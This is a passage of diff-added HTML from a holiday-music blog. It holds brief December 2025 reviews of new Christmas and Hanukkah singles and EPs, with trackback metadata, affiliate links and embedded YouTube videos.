+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/secret-santa-chance-the-rapper-and-jeremih-self-issued.html" rel="bookmark">Secret Santa, Chance the Rapper and Jeremih (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-27T13:14:24-05:00">December 27, 2025  1:14 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/secret-santa-chance-the-rapper-and-jeremih-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/secret-santa-chance-the-rapper-and-jeremih-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><img alt="chancesecret.jpg" src="http://www.mistletunes.com/art/chancesecret.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" />These two hip-hoppers have previously released <a href="http://www.mistletunes.com/2016/12/merry-christmas-lil-mama-jeremih-chance-self-issued.html" target="_blank">Christmas collections</a> of tunes going back to 2016, and they're back in 2025 with this five-song EP that dropped Christmas day. All are mid-tempo jams and fairly lively-sounding, my choices here would be "Black Santa" and "Gloria." The rest are "Safe With Me," "I Want What I Want," and "Bless Them All." Like the others, this is only available on <a href="https://soundcloud.com/chancetherapper/sets/secret-santa" target="_blank">Soundcloud</a>.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/nightmares-of-christmas-past-ep-nolan-potter-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2823"
+    dc:title="Nightmares of Christmas Past EP, Nolan Potter (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/nightmares-of-christmas-past-ep-nolan-potter-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="Austin, TX-based Potter describes himself as a &quot;bedroom wizard,&quot; and this 2025 collection does have the feel of a homebrew project. But that&apos;s not a bad thing. The description indicates this release was compiled from a lot of different previous..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-26T14:33:56-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2824" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/nightmares-of-christmas-past-ep-nolan-potter-self-issued.html" rel="bookmark">Nightmares of Christmas Past EP, Nolan Potter (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-26T14:33:56-05:00">December 26, 2025  2:33 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/nightmares-of-christmas-past-ep-nolan-potter-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/nightmares-of-christmas-past-ep-nolan-potter-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><img alt="nolanpotter.jpg" src="http://www.mistletunes.com/art/nolanpotter.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" />Austin, TX-based Potter describes himself as a "bedroom wizard," and this 2025 collection does have the feel of a homebrew project. But that's not a bad thing. The description indicates this release was compiled from a lot of different previous projects, and it's mainly his vision of a fairly eclectic selection of covers, like "One More Sleep 'til Christmas" with Julie Wierd, fairly conventional versions of "It's Beginning to Look a Lot Like Christmas" and "Have Yourself a Merry Little Christmas" with Lindsey Mackin, same for "My Favorite Things," a live band version of the "Home Alone" theme, and two songs from the James Bond film "On Her Majesty's Secret Service," the title song plus "We Have All the Time in the World." I wouldn't call this an essential grab for your holiday playlists, but it does reward multiple listenings. Grab this from <a href="https://nolanpotter.bandcamp.com/album/nightmares-of-christmas-past-ep" target="_blank">Bandcamp</a>, no other streaming options available.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/kraftwerkhristmas-dj-tenderloin-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2822"
+    dc:title="Kraftwerkhristmas, DJ Tenderloin (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/kraftwerkhristmas-dj-tenderloin-self-issued.html"
+    dc:subject="Novelties"
+    dc:description="Well, I didn&apos;t have a Kraftwerk Christmas parody on my bingo card for 2025, or any year really. This is a single that smushes Christmas carols into the Kraftwerk song &quot;Pocket Calculator,&quot; and steals some other stuff along the way,..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-26T14:15:36-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2823" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/kraftwerkhristmas-dj-tenderloin-self-issued.html" rel="bookmark">Kraftwerkhristmas, DJ Tenderloin (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-26T14:15:36-05:00">December 26, 2025  2:15 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/kraftwerkhristmas-dj-tenderloin-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/kraftwerkhristmas-dj-tenderloin-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><img alt="kraftwerkxmas.jpg" src="http://www.mistletunes.com/art/kraftwerkxmas.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" />Well, I didn't have a Kraftwerk Christmas parody on my bingo card for 2025, or any year really. This is a single that smushes Christmas carols into the Kraftwerk song "Pocket Calculator," and steals some other stuff along the way, including a snippet of "South Park." Flip it over for "Neon Xmas Lights," more of a straight mashup of the Germans with Smokey Robinson, Prince, Luther Vandross, Beastie Boys and "Star Wars Christmas." If you like that, the artist offers a separate tune, "Hanukkah Falls on the Sabbath," which is Jack Black vs Black Sabbath. Get this from <a href="https://djtenderloin.bandcamp.com/album/kraftwerkhristmas-a-kraftwerk-inspired-single" target="_blank">Bandcamp</a>, no other streaming option I can discover.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/i-want-a-different-presidnent-for-christmas-emory-jones-sad-girl.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2821"
+    dc:title="&quot;I Want a Different President For Christmas,&quot; Emory Jones (Sad Girl)"
+    dc:identifier="http://www.mistletunes.com/2025/12/i-want-a-different-presidnent-for-christmas-emory-jones-sad-girl.html"
+    dc:subject="Novelties"
+    dc:description="Got tipped to this during Christmas Eve dinner, this is the first chance I&apos;ve had to put it up. Set to that hippopotamus song, it gets its point across quickly. Too bad I didn&apos;t have it for this Christmas so..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-26T13:57:37-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2822" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/i-want-a-different-presidnent-for-christmas-emory-jones-sad-girl.html" rel="bookmark">"I Want a Different President For Christmas," Emory Jones (Sad Girl)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-26T13:57:37-05:00">December 26, 2025  1:57 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/i-want-a-different-presidnent-for-christmas-emory-jones-sad-girl.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/i-want-a-different-presidnent-for-christmas-emory-jones-sad-girl.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p>Got tipped to this during Christmas Eve dinner, this is the first chance I've had to put it up. Set to that hippopotamus song, it gets its point across quickly. Too bad I didn't have it for this Christmas so you could playlist it, but those of you who celebrate Orthodox Christmas still have a shot. It started out as a TikTok, but has migrated to YouTube and <a href="https://amzn.to/4b73N9S" target="_blank">streaming</a> as well.</p>
+<p>
+<iframe width="480" height="315" src="https://www.youtube.com/embed/gwMN611bxwc?si=R3kCjq4vpS4fysZj" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/a-word-from-the-proprietor.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2820"
+    dc:title="A word from the proprietor"
+    dc:identifier="http://www.mistletunes.com/2025/12/a-word-from-the-proprietor.html"
+    dc:subject="Housekeeping"
+    dc:description="My holiday travel plans require me to step away from the screen earlier than normal, so I&apos;d like to once again thank readers and followers of this website for sticking with me as I continue my semi-obsession with this website..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-23T15:27:29-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2821" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/a-word-from-the-proprietor.html" rel="bookmark">A word from the proprietor</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-23T15:27:29-05:00">December 23, 2025  3:27 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/a-word-from-the-proprietor.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/a-word-from-the-proprietor.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p>My holiday travel plans require me to step away from the screen earlier than normal, so I'd like to once again thank readers and followers of this website for sticking with me as I continue my semi-obsession with this website and its mission of tracking new and obscure Christmas music in the general rock 'n roll multiverse. I continue with mixed feelings given that the mission used to be acquiring songs in physical form back when I started doing this in the 1990s and now it's a question of tracking 1's and 0's across the digital realm. The fact that our main pipelines to music think nothing of choosing the next song for you before you can decide what you want to hear also feels kind of diminishing. On the other hand, building original playlists to share with your friends is easier than ever, so there's that. Merry Christmas and happy holidays, and as always I've managed to find you a small silly gift, below.</p>
+<p>
+<iframe width="480" height="295" src="https://www.youtube.com/embed/IcVqCWkNjSU?si=r71G_FwwHsifYXeW" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/cities-light-the-streets-for-you-paula-kelley-wharf-cat.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2819"
+    dc:title="&quot;Cities Light the Streets For You,&quot; Paula Kelley (Wharf Cat)"
+    dc:identifier="http://www.mistletunes.com/2025/12/cities-light-the-streets-for-you-paula-kelley-wharf-cat.html"
+    dc:subject="Rock and Pop"
+    dc:description="Paula is a veteran of the Boston music scene who performed with the Drop Nineteens and Boy Wonder before going solo, and she&apos;s popped up on a couple of ancient Christmas compilations in the past. For 2025 she gives us..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-23T15:01:09-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2820" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/cities-light-the-streets-for-you-paula-kelley-wharf-cat.html" rel="bookmark">"Cities Light the Streets For You," Paula Kelley (Wharf Cat)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-23T15:01:09-05:00">December 23, 2025  3:01 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/cities-light-the-streets-for-you-paula-kelley-wharf-cat.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/cities-light-the-streets-for-you-paula-kelley-wharf-cat.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/44HPKUo"><img alt="paulakelley.jpg" src="http://www.mistletunes.com/art/paulakelley.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>Paula is a veteran of the Boston music scene who performed with the Drop Nineteens and Boy Wonder before going solo, and she's popped up on a couple of ancient Christmas compilations in the past. For 2025 she gives us this cool Brill Building-via-synthpop ballad, very dramatic and heartstring-tugging thanks to her little-girl vocal style. Downloads and streaming everywhere.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/the-penny-the-leevees-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2818"
+    dc:title="&quot;The Penny,&quot; The Leevees (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/the-penny-the-leevees-self-issued.html"
+    dc:subject="Hanukkah"
+    dc:description="The Hanukkah band from two decades ago is back with this single providing us with a rocking song based on an old proverb. It&apos;s neat and doesn&apos;t stick out as a Hanukkah song, if that means anything to you. Streaming..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-23T14:30:59-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2819" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/the-penny-the-leevees-self-issued.html" rel="bookmark">"The Penny," The Leevees (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-23T14:30:59-05:00">December 23, 2025  2:30 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/the-penny-the-leevees-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/the-penny-the-leevees-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4arnLvO"><img alt="leeveepenny.jpg" src="http://www.mistletunes.com/art/leeveepenny.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>The Hanukkah band from two decades ago is back with this single providing us with a rocking song based on an old proverb. It's neat and doesn't stick out as a Hanukkah song, if that means anything to you. Streaming and downloads. Should note that the band included this and another song, "Jewish Stars," on a revamped and newly vinylized version of their original <a href="http://www.mistletunes.com/2008/02/hanukkah-rocks-the-leevees-reprise.html" target="_blank"><strong>Hanukkah Rocks</strong></a> album, but you'll have to go to <a href="https://theleevees1.bandcamp.com/album/20th-anniversary-vinyl-limited-edition-lp" target="_blank">Bandcamp</a> to get it if you still can. Oh, should note that I completely whiffed back in 2015 when I missed these guys joining up with Matisyahu for the kosher reggae <a href="https://amzn.to/3MRRiVF" target="_blank">"Outside of December."</a></p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/merry-cobramas-delcobras-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2817"
+    dc:title="Merry Cobramas, DelCobras (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/merry-cobramas-delcobras-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="Cool Philly band drops a pair of pop-punk covers for 2025, the George Harrison song &quot;Ding Dong Ding Dong,&quot; good for Christmas and New Year&apos;s playlists both, and Wham&apos;s &quot;Last Christmas.&quot; Streaming and download everywhere...."
+    dc:creator="Rudolph"
+    dc:date="2025-12-23T14:14:42-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2818" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/merry-cobramas-delcobras-self-issued.html" rel="bookmark">Merry Cobramas, DelCobras (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-23T14:14:42-05:00">December 23, 2025  2:14 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/merry-cobramas-delcobras-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/merry-cobramas-delcobras-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4s9n5BC"><img alt="delcobras.jpg" src="http://www.mistletunes.com/art/delcobras.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>Cool Philly band drops a pair of pop-punk covers for 2025, the George Harrison song "Ding Dong Ding Dong," good for Christmas and New Year's playlists both, and Wham's "Last Christmas." Streaming and download everywhere.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/christmas-bonus-airbourne-spinefarm.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2816"
+    dc:title="&quot;Christmas Bonus,&quot; Airbourne (Spinefarm)"
+    dc:identifier="http://www.mistletunes.com/2025/12/christmas-bonus-airbourne-spinefarm.html"
+    dc:subject="Rock and Pop"
+    dc:description="These Aussies carry the AC/DC flag forward for 2025 with this tune about a holiday tradition, although the human resources department at your workplace might not approve. But it&apos;s a driving rocker that&apos;ll wake up your playlists. Streaming and downloads,..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-23T14:06:25-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2817" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/christmas-bonus-airbourne-spinefarm.html" rel="bookmark">"Christmas Bonus," Airbourne (Spinefarm)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-23T14:06:25-05:00">December 23, 2025  2:06 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/christmas-bonus-airbourne-spinefarm.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/christmas-bonus-airbourne-spinefarm.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4jaV7Bn"><img alt="airbourne.jpg" src="http://www.mistletunes.com/art/airbourne.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>These Aussies carry the AC/DC flag forward for 2025 with this tune about a holiday tradition, although the human resources department at your workplace might not approve. But it's a driving rocker that'll wake up your playlists. Streaming and downloads, natch.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/the-flesh-eating-rollerskate-holiday-joyride-psychostick-rock-ridge.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/830"
+    dc:title="The Flesh Eating Rollerskate Holiday Joyride, Psychostick (Rock Ridge)"
+    dc:identifier="http://www.mistletunes.com/2025/12/the-flesh-eating-rollerskate-holiday-joyride-psychostick-rock-ridge.html"
+    dc:subject="Rock and Pop"
+    dc:description="UPDATE: This album got a major update for 2025, with the original tunes remixed and remastered and a couple new ones added: &quot;AEt,&quot; a thrasher that appears to be a jaundiced look at holiday sugar intake, and the even more..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-23T14:01:11-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-831" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/the-flesh-eating-rollerskate-holiday-joyride-psychostick-rock-ridge.html" rel="bookmark">The Flesh Eating Rollerskate Holiday Joyride, Psychostick (Rock Ridge)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-23T14:01:11-05:00">December 23, 2025  2:01 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/the-flesh-eating-rollerskate-holiday-joyride-psychostick-rock-ridge.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/the-flesh-eating-rollerskate-holiday-joyride-psychostick-rock-ridge.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4qoOGgz"><img alt="psychostick2.jpg" src="http://www.mistletunes.com/art/psychostick2.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a><strong>UPDATE:</strong> This album got a major update for 2025, with the original tunes remixed and remastered and a couple new ones added: "AEt," a thrasher that appears to be a jaundiced look at holiday sugar intake, and the even more intense "Everybody Christmas," which they're promoting as a single. Album cover and link to Amazon are updated at right. <strong>END UPDATE.</strong> Those of you whose life paths carry you a little too close to the retail sector might well be sick of Christmas already. If that's you, <a href="http://psychostick.com/">these guys</a> might well be your holiday soundtrack, assuming metal crunch with a side order of laughs is your favored genre. On this 2007 disc, "Holiday Hate" brings the bitch list with its "Consumers gotta BUY" chorus, its declaration that Santa doesn't exist and its complaint that Christmas goodies make us fat. Despite the fact that Santa doesn't exist, he turns out to be a "Jollly Old Sadist" who doesn't come through on the wish lists unless you really wanted a shirt box full of socks. "Jingle Bell Metal" is pretty much as advertised, "Silent Night" is nothing of the kind, though it's only 25 seconds long, "Red Snow" is Rudolph's snuff-horror fantasy, causing <a href="http://en.wikipedia.org/wiki/Johnny_Marks">Johnny Marks</a> to roll over in his grave no doubt, and how else to cap off the festivities than with "Happy F- New Year."</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/christmas-at-wrigley-vista-blue-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2815"
+    dc:title="&quot;Christmas at Wrigley,&quot; Vista Blue (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/christmas-at-wrigley-vista-blue-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="Some cool punk rock from these guys in 2025 celebrating the holiday at the famed Chicago Cubs ballpark. How that works I&apos;m not sure, I don&apos;t think there&apos;s much going on there between October and April, but sports fans will..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-23T13:46:48-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2816" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/christmas-at-wrigley-vista-blue-self-issued.html" rel="bookmark">"Christmas at Wrigley," Vista Blue (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-23T13:46:48-05:00">December 23, 2025  1:46 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/christmas-at-wrigley-vista-blue-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/christmas-at-wrigley-vista-blue-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4jvC59f"><img alt="vistawrigley.jpg" src="http://www.mistletunes.com/art/vistawrigley.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>Some cool punk rock from these guys in 2025 celebrating the holiday at the famed Chicago Cubs ballpark. How that works I'm not sure, I don't think there's much going on there between October and April, but sports fans will certainly go along. Flip it over for "Santa's Coffee," a little less frenetic but no less rocking about giving the jolly elf a pick-me-up before the big night. Streaming and downloads, natch. Should note that this isn't <a href="https://wearevistablue.bandcamp.com/music" target="_blank">the band's</a> first holiday go-round, plus they have a side project as <a href="https://ralphiesredryders.bandcamp.com/track/black-bart" target="_blank">Ralphie's Red Ryders</a> doing songs exclusively about the movie "A Christmas Story." </p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/christmastime-christmas-time-machine-chaz-kangas-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2814"
+    dc:title="&quot;Christmastime Christmas Time Machine,&quot; Chaz Kangas (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/christmastime-christmas-time-machine-chaz-kangas-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="I&apos;ve been remiss if I believe this Minneapolis guy&apos;s Bandcamp blurb about how this 2025 tune is his 20th annual holiday single. Doesn&apos;t appear they&apos;re all on Bandcamp, but there&apos;s a bunch of them there. For now I&apos;ll just stick..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-22T14:33:57-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2815" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/christmastime-christmas-time-machine-chaz-kangas-self-issued.html" rel="bookmark">"Christmastime Christmas Time Machine," Chaz Kangas (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-22T14:33:57-05:00">December 22, 2025  2:33 PM</abbr>
+    
+            </span>
+
